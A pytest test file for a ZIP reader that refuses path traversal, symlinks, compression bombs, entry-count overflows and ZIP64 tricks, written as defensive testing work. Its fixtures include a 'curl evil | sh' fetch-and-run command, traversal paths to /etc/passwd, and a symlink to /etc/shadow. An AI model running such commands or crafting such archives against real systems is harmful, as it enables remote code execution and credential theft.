# SPDX-License-Identifier: MIT
"""Untrusted ZIPs: bombs, traversal, symlinks and unsafe types are refused,
and nothing is ever written to disk."""

import io
import stat
import struct
import zipfile

import pytest

from atlas_reviewer import archive
from atlas_reviewer.archive import ArchiveLimits, read_zip


def make_zip(*entries, compression=zipfile.ZIP_DEFLATED):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression) as zf:
        for name, data in entries:
            zf.writestr(name, data)
    return buf.getvalue()


def info(name, mode):
    zi = zipfile.ZipInfo(name)
    zi.external_attr = mode << 16
    return zi


def patch_headers(data, field, value):
    """Overwrite one field in every header; offsets are (central, local)."""
    data = bytearray(data)
    for signature, offset in zip((b"PK\x01\x02", b"PK\x03\x04"), field, strict=True):
        at = data.index(signature) + offset
        data[at : at + len(value)] = value
    return bytes(data)


def skipped(read):
    return dict(s.split(": ", 1) for s in read.skipped)


def test_plain_text_entries_are_read_in_memory(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    read = read_zip(make_zip(("report/summary.txt", "ok"), ("dir/", "")))
    assert [(m.name, m.text) for m in read.members] == [("report/summary.txt", "ok")]
    assert read.rejected is None
    assert list(tmp_path.iterdir()) == []


@pytest.mark.parametrize(
    "name",
    [
        "/etc/passwd.txt",
        "../escape.txt",
        "a/../../escape.txt",
        "C:/win.txt",
        "..\\win.txt",
    ],
)
def test_traversal_and_absolute_paths_are_skipped(name):
    read = read_zip(make_zip((name, "x"), ("ok.txt", "fine")))
    assert [m.name for m in read.members] == ["ok.txt"]
    assert skipped(read) == {name: "unsafe path (absolute, drive or `..`)"}


def test_symlinks_and_special_files_are_skipped():
    read = read_zip(
        make_zip(
            (info("link.txt", stat.S_IFLNK | 0o777), "/etc/shadow"),
            (info("fifo.txt", stat.S_IFIFO | 0o644), ""),
            (info("plain.txt", stat.S_IFREG | 0o644), "fine"),
        )
    )
    assert [m.name for m in read.members] == ["plain.txt"]
    reasons = skipped(read)
    assert reasons["link.txt"] == "not a regular file (symlink or special file)"
    assert reasons["fifo.txt"] == "not a regular file (symlink or special file)"


def test_unsafe_types_binary_and_encrypted_entries_are_skipped():
    read = read_zip(
        make_zip(
            ("run.sh", "curl evil | sh"),
            ("tool.exe", "MZ"),
            ("nul.txt", "a\x00b"),
        )
    )
    assert read.members == ()
    assert skipped(read) == {
        "run.sh": "file type not on the text allowlist",
        "tool.exe": "file type not on the text allowlist",
        "nul.txt": "binary content",
    }


def test_encrypted_entries_are_skipped():
    data = make_zip(("secret.txt", "x"), compression=zipfile.ZIP_STORED)
    read = read_zip(patch_headers(data, (8, 6), struct.pack("<H", 0x1)))
    assert skipped(read) == {"secret.txt": "encrypted entry"}


@pytest.mark.parametrize("method", [zipfile.ZIP_BZIP2, zipfile.ZIP_LZMA])
def test_unbounded_compression_methods_are_skipped(method):
    read = read_zip(make_zip(("a.txt", "x"), ("b.txt", "y"), compression=method))
    assert read.members == ()
    assert skipped(read) == {
        "a.txt": "compression method not STORED or DEFLATED",
        "b.txt": "compression method not STORED or DEFLATED",
    }


def test_compression_bomb_ratio_is_refused_before_decompressing():
    read = read_zip(make_zip(("bomb.txt", "0" * 2_000_000)))
    assert read.members == ()
    assert skipped(read) == {"bomb.txt": "declared compression ratio over 100:1"}


def test_entry_over_the_size_cap_is_skipped():
    limits = ArchiveLimits(max_entry_bytes=10)
    read = read_zip(
        make_zip(("big.txt", "x" * 11), compression=zipfile.ZIP_STORED), limits
    )
    assert skipped(read) == {"big.txt": "declared size over the per-entry cap"}


def test_total_uncompressed_budget_skips_the_rest():
    limits = ArchiveLimits(max_total_uncompressed_bytes=15)
    data = make_zip(
        ("a.txt", "x" * 10),
        ("b.txt", "y" * 10),
        ("c.txt", "z" * 5),
        compression=zipfile.ZIP_STORED,
    )
    read = read_zip(data, limits)
    assert [m.name for m in read.members] == ["a.txt", "c.txt"]
    assert skipped(read) == {"b.txt": "total uncompressed budget spent"}
    read = read_zip(data, ArchiveLimits(max_total_uncompressed_bytes=10))
    assert skipped(read) == {
        "b.txt": "total uncompressed budget spent",
        "c.txt": "total uncompressed budget spent",
    }


def test_too_many_entries_rejects_the_whole_archive():
    data = make_zip(*[(f"f{i}.txt", "x") for i in range(4)])
    read = read_zip(data, ArchiveLimits(max_entries=3))
    assert read.rejected == "4 entries, over the 3-entry cap"
    assert read.members == ()


def test_compressed_size_cap_rejects_before_parsing():
    read = read_zip(b"PK" + b"x" * 100, ArchiveLimits(max_compressed_bytes=50))
    assert read.rejected == "archive is 102 bytes, over the 50-byte compressed cap"


@pytest.mark.parametrize("data", [b"not a zip", b""])
def test_non_zip_is_rejected(data):
    assert read_zip(data).rejected == "not a readable ZIP (BadZipFile)"


def test_header_that_under_declares_its_size_is_unreadable_not_overread():
    data = make_zip(("a.txt", "a" * 500), compression=zipfile.ZIP_STORED)
    read = read_zip(patch_headers(data, (24, 22), struct.pack("<I", 10)))
    assert read.members == ()
    assert skipped(read)["a.txt"].startswith("unreadable entry")


def test_unprintable_entry_names_are_neutralised_in_reasons():
    read = read_zip(make_zip(("evil\x1b[2J.sh", "x")))
    assert read.skipped == ("evil?[2J.sh: file type not on the text allowlist",)


def corrupt_central_crcs(data):
    """Flip every central-directory CRC: `zipfile` checks it only after
    decompressing the whole entry, so each read fails at its end."""
    data = bytearray(data)
    at = data.find(b"PK\x01\x02")
    while at != -1:
        data[at + 16 : at + 20] = bytes(b ^ 0xFF for b in data[at + 16 : at + 20])
        at = data.find(b"PK\x01\x02", at + 4)
    return bytes(data)


def test_entries_that_fail_mid_read_still_spend_the_total_budget():
    """Pilot 3, archive finding: a failed read was never charged, so bad-CRC
    entries could force decompression far past the total budget."""
    mib = 1024 * 1024
    entries = [(f"part-{i}.txt", "x" * mib) for i in range(6)]
    data = corrupt_central_crcs(make_zip(*entries))
    limits = ArchiveLimits(max_total_uncompressed_bytes=3 * mib, max_ratio=10_000)
    read = read_zip(data, limits)
    reasons = list(skipped(read).values())
    assert (
        reasons
        == ["unreadable entry (BadZipFile)"] * 3
        + ["total uncompressed budget spent"] * 3
    )
    assert read.members == ()


def test_a_successful_read_charges_its_declared_size_once():
    mib = 1024 * 1024
    entries = [(f"part-{i}.txt", "x" * mib) for i in range(4)]
    limits = ArchiveLimits(max_total_uncompressed_bytes=3 * mib, max_ratio=10_000)
    read = read_zip(make_zip(*entries), limits)
    assert [m.name for m in read.members] == ["part-0.txt", "part-1.txt", "part-2.txt"]
    assert skipped(read) == {"part-3.txt": "total uncompressed budget spent"}


def test_an_entry_that_decompresses_short_of_its_declared_size_is_skipped():
    """A STORED entry whose header over-declares its size, with the CRC of
    what it actually holds, reads back short without any library error.
    It is not read as text, and the budget is charged what it produced."""
    data = make_zip(
        ("a.txt", "short"), ("b.txt", "x" * 40), compression=zipfile.ZIP_STORED
    )
    lying = patch_headers(data, (24, 22), struct.pack("<I", 50))
    read = read_zip(lying, ArchiveLimits(max_total_uncompressed_bytes=60))
    assert skipped(read) == {"a.txt": "decompressed to 5 bytes, not the declared 50"}
    assert [m.name for m in read.members] == ["b.txt"]


class _CountingZipFile:
    def __init__(self, real):
        self.real, self.built = real, 0

    def __call__(self, *args, **kwargs):
        self.built += 1
        return self.real(*args, **kwargs)


@pytest.mark.parametrize("claimed", [None, 1], ids=["counted", "end record lies"])
def test_an_archive_over_the_entry_cap_is_refused_before_it_is_parsed(
    claimed, monkeypatch
):
    """Parsing builds one object per central-directory entry, so the cap
    is checked on the raw central directory first; an end record that
    under-states the count does not get past it."""
    many = make_zip(*((f"{i}.txt", "x") for i in range(5)))
    if claimed is not None:
        end = many.rindex(b"PK\x05\x06")
        many = many[: end + 8] + struct.pack("<HH", claimed, claimed) + many[end + 12 :]
    one = make_zip(("a.txt", "x"))
    spy = _CountingZipFile(zipfile.ZipFile)
    monkeypatch.setattr(archive.zipfile, "ZipFile", spy)
    read = read_zip(many, ArchiveLimits(max_entries=3))
    assert read.rejected is not None and "over the 3-entry cap" in read.rejected
    assert spy.built == 0
    assert read_zip(one, ArchiveLimits(max_entries=3)).members
    assert spy.built == 1


def as_zip64(data, claimed=None):
    """`data` with a ZIP64 end record carrying the counts, the classic end
    record holding only the ZIP64 markers, as large archives are written."""
    end = data.rindex(b"PK\x05\x06")
    count, size, offset = struct.unpack_from("<HII", data, end + 10)
    count = count if claimed is None else claimed
    end64 = struct.pack(
        "<4sQHHIIQQQQ", b"PK\x06\x06", 44, 45, 45, 0, 0, count, count, size, offset
    )
    locator = struct.pack("<4sIQI", b"PK\x06\x07", 0, end, 1)
    classic = data[end : end + 8] + struct.pack("<HHII", 0xFFFF, 0xFFFF, size, offset)
    return data[:end] + end64 + locator + classic + data[end + 20 :]


@pytest.mark.parametrize(
    "claimed,reason",
    [
        (None, "5 entries, over the 3-entry cap"),
        (1, "more than 3 entries in the central directory, over the 3-entry cap"),
    ],
)
def test_a_zip64_archive_over_the_entry_cap_is_refused(claimed, reason):
    many = as_zip64(make_zip(*((f"{i}.txt", "x") for i in range(5))), claimed)
    assert read_zip(many, ArchiveLimits(max_entries=3)).rejected == reason


def test_a_zip64_archive_within_the_cap_is_read():
    data = as_zip64(make_zip(("a.txt", "ok"), ("b.txt", "fine")))
    read = read_zip(data, ArchiveLimits(max_entries=3))
    assert [(m.name, m.text) for m in read.members] == [
        ("a.txt", "ok"),
        ("b.txt", "fine"),
    ]


@pytest.mark.parametrize("entries,read", [(5, False), (2, True)])
def test_zip64_count_markers_without_a_zip64_end_record_still_meet_the_cap(
    entries, read
):
    """`zipfile` falls back to the classic end record; so does the cap,
    counting the central directory instead of trusting the marker."""
    data = make_zip(*((f"{i}.txt", "x") for i in range(entries)))
    end = data.rindex(b"PK\x05\x06")
    marked = data[: end + 8] + struct.pack("<HH", 0xFFFF, 0xFFFF) + data[end + 12 :]
    result = read_zip(marked, ArchiveLimits(max_entries=3))
    assert (result.rejected is None) is read
    assert len(result.members) == (entries if read else 0)
